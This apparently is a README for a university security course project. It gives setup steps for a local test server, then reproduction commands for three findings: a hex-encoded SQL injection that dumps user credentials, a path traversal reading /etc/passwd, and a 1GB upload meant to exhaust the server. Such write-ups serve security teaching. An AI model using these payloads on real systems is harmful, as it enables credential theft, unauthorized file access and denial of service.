# csci4271-proj2
- Let url be the path to access 443
- "enter" means putting the string in the search bar in web browser
- lines without "enter" is input in terminal

Running the program:
- git clone...
- ./install.sh
- make
- sudo ./bcpwm-server
- -> Change to another terminal, navigate to the same directory

Setting up the database
- Adding a user with hexmail = "1", hexpass = "2":
- enter "<url>/init_client/31/32"
- Confirm user added:
- enter "<url>/confirm-client/31/32/<token>"
- Adding a rule
- enter "<url>/post-rule/init/admin/1"

# Finding 1: Inject SQL to extract all user credentials
- Expected result: List of all users and passwords
- payload=$(echo "' UNION SELECT user, password FROM user_pw_table;--" | xxd -p)
- curl -k "<url>/init_client/${payload}/31"

# Finding 2: Inject '../' into the file path parameter to read unauthorized files
- Expected result: Contents of /etc/passwd
- payload=$(echo "../../etc/passwd" | xxd -p)
- enter "<url>/get_rule/${payload}"

# Finding 3: Generate a large file (1GB) and upload it
- Expected result: Server becomes unresponsive or logs indicate resource exhaustion.
- dd if=/dev/zero of=largefile.txt bs=1M count=1024
- curl -X POST -F "file=@largefile.txt" -k "<url>/post-rule/init/validsite/validuser"





